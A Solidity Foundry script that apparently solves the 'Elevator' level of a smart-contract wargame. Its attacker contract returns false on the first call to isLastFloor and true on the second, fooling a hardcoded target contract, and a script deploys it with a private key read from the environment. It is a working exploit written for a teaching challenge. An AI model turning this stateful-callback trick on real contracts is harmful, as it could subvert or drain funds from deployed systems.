// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Elevator} from "../src/level11Elevator.sol";

contract MyBuilding {
    Elevator elevator = Elevator(0x7308cF93f1811Bf3cADac96b7154F2627B9a068f);
    bool public mySwitch;

    function startAttack() external {
        elevator.goTo(0);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!mySwitch) {
            mySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}

contract Level10Solution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding building = new MyBuilding();
        building.startAttack();
        vm.stopBroadcast();
    }
}
